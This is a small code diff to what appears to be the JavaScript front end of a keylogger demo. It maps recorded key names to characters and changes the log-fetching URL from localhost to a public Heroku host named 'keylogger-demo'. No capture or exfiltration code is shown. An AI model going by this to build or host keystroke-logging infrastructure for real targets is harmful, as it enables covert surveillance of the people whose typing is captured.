@@ -20,7 +20,7 @@ function convert_th(caller){
 }
 
 const replace_list = {"period": ".", "backslash": "\\", "P_Divide": "/", "space": " ", "quotedbl": "\"", "comma": ",", "apostrophe": "'", "colon": ":", "semicolon": ";"};
-let get_url = path => "http://localhost:5000/" + path
+let get_url = path => "https://keylogger-demo.herokuapp.com/" + path
 
 function load_content(){
     $("#log_list").addClass("loading");
